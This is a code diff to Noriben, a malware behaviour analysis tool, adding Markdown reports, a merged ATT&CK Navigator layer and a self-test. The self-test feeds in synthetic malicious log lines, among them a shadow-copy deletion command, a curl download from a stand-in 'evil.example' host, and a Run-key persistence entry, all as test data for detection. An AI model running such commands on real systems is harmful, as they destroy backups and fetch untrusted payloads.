@@ -8,6 +8,13 @@
 # clean text report and timeline
 #
 # Changelog:
+# Version 3.2.0 - 04 Jun 2026 (poppopjmp fork)
+#       Usability & sharing:
+#           --md writes a clean Markdown report for tickets/wikis/PRs
+#           --selftest validates the analysis engine against a synthetic sample
+#           (no Procmon needed) for quick install checks
+#           --merge now also emits a consolidated ATT&CK Navigator layer showing
+#           technique frequency across runs
 # Version 3.1.0 - 04 Jun 2026 (poppopjmp fork)
 #       Answers "what is it?" alongside "is it bad?":
 #           Deterministic threat classification (Ransomware, Downloader/Dropper,
@@ -273,7 +280,7 @@ except ImportError:
     configparser = None
 
 # Below are global internal variables. Do not edit these. ################
-__VERSION__ = '3.1.0'
+__VERSION__ = '3.2.0'
 use_pmc = False
 use_virustotal = False
 vt_results = {}
@@ -382,6 +389,7 @@ def read_config(config_filename):
         'disable-file-hash': False,
         'json_report': False,
         'html_report': False,
+        'md_report': False,
         'gen_yara': False,
         'gen_sigma': False,
         'navigator_export': False,
@@ -2405,10 +2413,175 @@ def run_consolidation(paths, config):
         with open(base + '.html', 'w', encoding='utf-8') as handle:
             handle.write(build_consolidated_html(consolidated, metadata))
         print('[*] Saving consolidated HTML to: {}.html'.format(base))
+        with open(base + '.navigator.json', 'w', encoding='utf-8') as handle:
+            json.dump(build_consolidated_navigator(consolidated, metadata), handle, indent=2)
+        print('[*] Saving consolidated ATT&CK Navigator layer to: {}.navigator.json'.format(base))
     except OSError as err:
         print('[!] Error writing consolidated output: {}'.format(err))
 
     print('\n' + '\n'.join(text_lines))
+
+
+def build_markdown_report(report_data, metadata):
+    """
+    Render the run as a clean Markdown report, ideal for pasting into a ticket,
+    wiki, or pull request.
+
+    Arguments:
+        report_data: dict from build_json_report() (verdict/classification/tree)
+        metadata: dict of run metadata
+    Returns:
+        Markdown string
+    """
+    lines = ['# Noriben analysis report',
+             '',
+             '- **Sample:** {}'.format(metadata.get('command_line') or metadata.get('source_csv', 'n/a')),
+             '- **Generated:** {}'.format(metadata.get('generated', '')),
+             '- **Noriben:** v{}'.format(metadata.get('version', '')),
+             '']
+
+    verdict = report_data.get('verdict') or {}
+    if verdict:
+        lines += ['## Verdict',
+                  '',
+                  '**{}** — risk score {}/100 ({} confidence)'.format(
+                      verdict.get('verdict', '?'), verdict.get('score', 0), verdict.get('confidence', '?'))]
+        classification = report_data.get('classification') or {}
+        if classification.get('categories'):
+            lines.append('')
+            lines.append('Likely type: **{}** ({} confidence)'.format(
+                classification['primary'], classification.get('confidence', '')))
+        lines.append('')
+        for reason in verdict.get('reasons', []):
+            lines.append('- {}'.format(reason))
+        lines.append('')
+
+    by_tactic = report_data.get('attack_by_tactic') or []
+    if by_tactic:
+        lines += ['## ATT&CK coverage by tactic', '']
+        for group in by_tactic:
+            techs = ', '.join('`{}` {}'.format(t['id'], t['technique']) for t in group['techniques'])
+            lines.append('- **{}:** {}'.format(group['tactic'], techs))
+        lines.append('')
+
+    iocs = report_data.get('iocs', {})
+
+    def md_list(title, values):
+        if values:
+            lines.append('## {}'.format(title))
+            lines.append('')
+            for value in values:
+                lines.append('- `{}`'.format(value))
+            lines.append('')
+
+    md_list('Dropped file hashes', ['{}  {}'.format(h['hash'], h['path']) for h in iocs.get('file_hashes', [])])
+    md_list('Network hosts', iocs.get('hosts', []))
+    md_list('URLs', iocs.get('urls', []))
+    md_list('Public IPv4 addresses', iocs.get('ipv4', []))
+    md_list('Cryptocurrency addresses', iocs.get('bitcoin', []) + iocs.get('ethereum', []))
+    md_list('E-mail addresses', iocs.get('emails', []))
+    md_list('Mutexes', iocs.get('mutexes', []))
+    md_list('Named pipes', iocs.get('named_pipes', []))
+
+    tree = report_data.get('process_tree', [])
+    if tree:
+        lines += ['## Process tree', '', '```']
+
+        def walk(nodes, depth, seen):
+            for node in nodes:
+                if node['pid'] in seen:
+                    lines.append('{}[{}] (cycle)'.format('  ' * depth, node['pid']))
+                    continue
+                seen.add(node['pid'])
+                lines.append('{}[{}] {}'.format('  ' * depth, node['pid'], node['label'][:140]))
+                walk(node.get('children', []), depth + 1, seen)
+
+        walk(tree, 0, set())
+        lines += ['```', '']
+
+    return '\n'.join(lines) + '\n'
+
+
+def build_consolidated_navigator(consolidated, metadata):
+    """
+    Build a single ATT&CK Navigator layer aggregating technique frequency across
+    several runs (used by --merge). Score = number of runs the technique appears
+    in, so techniques shared across a family stand out on the matrix.
+
+    Arguments:
+        consolidated: dict from consolidate_reports()
+        metadata: dict of run metadata
+    Returns:
+        dict in ATT&CK Navigator layer format
+    """
+    run_count = consolidated.get('run_count', 0)
+    techniques = []
+    for entry in consolidated.get('categories', {}).get('attack_techniques', []):
+        technique_id = entry['value'].split(' ', 1)[0]
+        if not re.match(r'^T\d{4}', technique_id):
+            continue
+        techniques.append({
+            'techniqueID': technique_id,
+            'score': entry['count'],
+            'enabled': True,
+            'comment': 'Seen in {}/{} runs'.format(entry['count'], run_count)
+        })
+    return {
+        'name': 'Noriben consolidated ({} runs)'.format(run_count),
+        'versions': {'attack': '14', 'navigator': '4.9.5', 'layer': '4.5'},
+        'domain': 'enterprise-attack',
+        'description': 'Technique frequency across multiple Noriben runs.',
+        'sorting': 3,
+        'hideDisabled': True,
+        'techniques': techniques,
+        'gradient': {'colors': ['#ffe766', '#ffaf66', '#ff6666'], 'minValue': 0,
+                     'maxValue': max(run_count, 1)},
+        'legendItems': [{'label': 'Shared across all runs', 'color': '#ff6666'}],
+        'metadata': [{'name': 'generated', 'value': metadata.get('generated', '')}]
+    }
+
+
+def run_selftest():
+    """
+    Validate the analysis engine against a synthetic malicious run. Exercises
+    indicator parsing, ATT&CK detection, scoring, classification, and IOC
+    enrichment without needing Procmon. Returns True if every check passes.
+    """
+    process_output = [
+        '[CreateProcess] mal.exe:1 > vssadmin delete shadows /all /quiet\t[Child PID: 2]',
+        '[CreateProcess] mal.exe:1 > cmd /c curl http://evil.example/p.exe -o p.exe\t[Child PID: 3]'
+    ]
+    file_output = [
+        '[CreateFile] mal.exe:1 > C:\\Users\\v\\AppData\\Roaming\\evil.exe\t[SHA256: {}]'.format('a' * 64),
+        '[CreateFile] mal.exe:1 > C:\\Users\\v\\Desktop\\HOW_TO_DECRYPT.txt'
+    ]
+    reg_output = [
+        '[RegSetValue] mal.exe:1 > HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Evil  '
+        '=  send to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'
+    ]
+    indicators = analyze_indicators(process_output, file_output, reg_output, [], ['evil.example'])
+    techniques = detect_attack_techniques(indicators)
+    verdict = score_sample(indicators, techniques)
+    classification = classify_threat(indicators, techniques)
+    enriched = indicators.get('enriched', {})
+
+    checks = [
+        ('ATT&CK techniques detected (>=3)', len(techniques) >= 3),
+        ('Verdict is Malicious', verdict['verdict'] == 'Malicious'),
+        ('Classified as Ransomware', classification['primary'] == 'Ransomware'),
+        ('URL extracted', 'http://evil.example/p.exe' in enriched.get('urls', [])),
+        ('Bitcoin address extracted', bool(enriched.get('bitcoin'))),
+        ('Dropped file hash captured', bool(indicators['dropped_file_hashes'])),
+        ('Process tree built', bool(build_process_tree(indicators['processes'])))
+    ]
+
+    print('\n--===[ Noriben self-test (v{})'.format(__VERSION__))
+    passed_all = True
+    for label, passed in checks:
+        print('  [{}] {}'.format('PASS' if passed else 'FAIL', label))
+        passed_all = passed_all and passed
+    print('  => {}\n'.format('ALL CHECKS PASSED' if passed_all else 'SELF-TEST FAILED'))
+    return passed_all
 
 
 def build_run_html(report_data, metadata):
@@ -2937,6 +3110,8 @@ def parse_csv(csv_file, report, timeline):
                   as_json=False)
     _write_export(config.get('html_report'), '.report.html', 'HTML report',
                   lambda: build_run_html(json_report_data, report_metadata), as_json=False)
+    _write_export(config.get('md_report'), '.report.md', 'Markdown report',
+                  lambda: build_markdown_report(json_report_data, report_metadata), as_json=False)
 
     if config['debug'] and vt_dump:
         vt_file = os.path.join(config['output_folder'], os.path.splitext(csv_file)[0] + '.vt.json')
@@ -3126,6 +3301,11 @@ def main():
     parser.add_argument('--html', action='store_true',
                         help='Also write a single-file HTML dashboard (verdict, ATT&CK, IOCs, process tree)',
                         required=False)
+    parser.add_argument('--md', action='store_true',
+                        help='Also write a Markdown report (*.report.md) for tickets/wikis', required=False)
+    parser.add_argument('--selftest', action='store_true',
+                        help='Validate the analysis engine against a synthetic sample, then exit',
+                        required=False)
     parser.add_argument('--gen-yara', action='store_true',
                         help='Generate a suggested YARA rule from behavioral indicators', required=False)
     parser.add_argument('--gen-sigma', action='store_true',
@@ -3207,6 +3387,8 @@ def main():
         config['json_report'] = True
     if args.html:
         config['html_report'] = True
+    if args.md:
+        config['md_report'] = True
     if args.gen_yara:
         config['gen_yara'] = True
     if args.gen_sigma:
@@ -3219,6 +3401,10 @@ def main():
         config['misp_export'] = True
     if args.diff:
         config['diff_against'] = args.diff
+
+    # Built-in self-test of the analysis engine, then exit.
+    if args.selftest:
+        terminate_self(0 if run_selftest() else 50)
 
     # Consolidated multi-run mode: aggregate several JSON IOC reports and exit.
     if args.merge:
